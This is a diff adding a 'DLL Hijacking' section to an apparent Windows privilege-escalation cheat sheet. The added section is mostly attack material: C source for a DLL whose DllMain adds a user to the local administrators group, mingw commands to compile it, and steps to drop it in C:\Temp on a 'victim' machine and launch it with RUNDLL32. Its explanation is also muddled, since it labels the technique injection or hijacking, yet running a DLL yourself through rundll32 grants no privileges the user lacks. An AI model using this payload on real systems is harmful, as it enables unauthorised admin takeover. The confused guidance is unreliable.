@@ -1,6 +1,37 @@
 # Windows-PrivEsc
 
+## DLL Hijacking
+1. Make sure C:\Temp in the Victim Machine is a writable location for standard user.
+2. DLL Injection can be done via modifying any dll file in windows which can be run by the user.
+3. We can modify the dll or make our own dll .
+4. The dll file can be made by compiling the following code in the attacker machine and then placing it under C:\Temp in  Victim’s machine.
 
+CODE:
+```
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+   if (dwReason == DLL_PROCESS_ATTACH) {
+       system("cmd.exe /k net localgroup administrators $USER$ /add");
+       ExitProcess(0);
+   }
+   return TRUE;
+}
+```
+
+5. Replace $USER$ with standard user name account and the compile it with mingw ,
+6. For 64 bit - ```x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll```
+For 32 bit-  ```i686-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll```
+
+The above command will generate the dll file , which we will place in C:\Temp
+7. Execute the dll file inside the victim via inbuilt windows command i.e RUNDLL32.EXE
+Syntax for running the dll file :
+
+In command prompt :
+    cd /
+    cd /Temp
+    RUNDLL32.EXE hijackme.dll
+
+Boom.!  your user is now added to the local administrator group and you are having the full admin privileges .
 
 ## Binpath
 
